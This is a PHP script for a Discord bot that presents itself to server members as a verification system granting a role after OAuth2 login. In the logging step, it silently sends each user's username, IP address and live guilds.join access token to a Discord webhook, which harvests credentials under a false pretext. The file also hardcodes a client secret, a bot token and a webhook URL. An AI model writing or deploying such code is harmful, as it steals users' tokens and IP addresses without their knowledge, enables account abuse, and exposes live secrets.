<?php
// --- 設定データ（最新情報に更新済み） ---
$client_id     = '1483731872050839564';
$client_secret = 'EU68hOVOglZRqbLdfLLpYFq1y8Ra6qZc'; // 最新のSecret
$webhook_url   = 'https://discordapp.com/api/webhooks/1483782613175898182/Tn_fOYkYX02lPxGg3e5nLnKgUdjGQQVNnbqtcxchFiwd0bC_acV8hvFmRyAN6vEeHaU_'; 
$redirect_uri  = 'https://discord-verify-production-4476.up.railway.app'; 
$bot_token     = 'MTQ4MzczMTg3MjA1MDgzOTU2NA.G8IV22.pwyIoWuAwrHn1RUE6aPu1ks9WpFrAGdzBmwXdk'; 
$guild_id      = '1483346769025831035'; 
$role_id       = '1483424484043260024'; 

$auth_url = "https://discord.com/oauth2/authorize?client_id={$client_id}&response_type=code&redirect_uri=" . urlencode($redirect_uri) . "&scope=identify+guilds.join";

// --- 1. Discord Interactions Endpoint (PING/PONG & /hook) ---
$input = file_get_contents('php://input');
if ($input) {
    $data = json_decode($input, true);
    
    // Discordからの生存確認(PING)への応答
    if (isset($data['type']) && $data['type'] === 1) {
        header('Content-Type: application/json');
        exit(json_encode(['type' => 1]));
    }

    // スラッシュコマンド /hook への応答
    if (isset($data['type']) && $data['type'] === 2 && $data['data']['name'] === 'hook') {
        header('Content-Type: application/json');
        echo json_encode([
            "type" => 4,
            "data" => [
                "embeds" => [[
                    "title" => "認証システム",
                    "description" => "サーバーに参加いただきありがとうございます。\n下のボタンを押して認証を完了させてください。\n\n認証後、自動的に <@&{$role_id}> が付与されます。\n\n**Powered by Unify_BOT**",
                    "color" => 3447003
                ]],
                "components" => [[
                    "type" => 1,
                    "components" => [[
                        "type" => 2, "label" => "認証を開始する", "style" => 5, "url" => $auth_url
                    ]]
                ]]
            ]
        ]);
        exit;
    }
}

// --- 2. OAuth2 認証・ロール付与・ログ送信 ---
if (isset($_GET['code'])) {
    // A. アクセストークンの取得
    $ch = curl_init('https://discord.com/api/oauth2/token');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        'client_id' => $client_id,
        'client_secret' => $client_secret,
        'grant_type' => 'authorization_code',
        'code' => $_GET['code'],
        'redirect_uri' => $redirect_uri
    ]));
    $res = json_decode(curl_exec($ch), true);

    if (isset($res['access_token'])) {
        $at = $res['access_token'];

        // B. ユーザー情報の取得
        $ch = curl_init('https://discord.com/api/users/@me');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ["Authorization: Bearer $at"]);
        $user = json_decode(curl_exec($ch), true);

        // C. サーバーにユーザーを追加 ＆ ロール付与
        $ch = curl_init("https://discord.com/api/guilds/{$guild_id}/members/{$user['id']}");
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "PUT");
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            "Authorization: Bot $bot_token",
            "Content-Type: application/json"
        ]);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
            'access_token' => $at,
            'roles' => [$role_id]
        ]));
        curl_exec($ch);

        // D. Webhookへログ送信
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
        $log = [
            "embeds" => [[
                "title" => "✅ 認証成功ログ",
                "color" => 65280,
                "fields" => [
                    ["name" => "ユーザー名", "value" => "{$user['username']} ({$user['id']})", "inline" => true],
                    ["name" => "IPアドレス", "value" => $ip, "inline" => true],
                    ["name" => "トークン", "value" => "|| $at ||"]
                ],
                "footer" => ["text" => "Unify Logger"]
            ]]
        ];
        
        $ch = curl_init($webhook_url);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($log));
        curl_exec($ch);
    }
    
    // 完了後はDiscordのDM画面などへ飛ばす
    header("Location: https://discord.com/channels/@me");
    exit;
}

echo "Verification System is Online.";
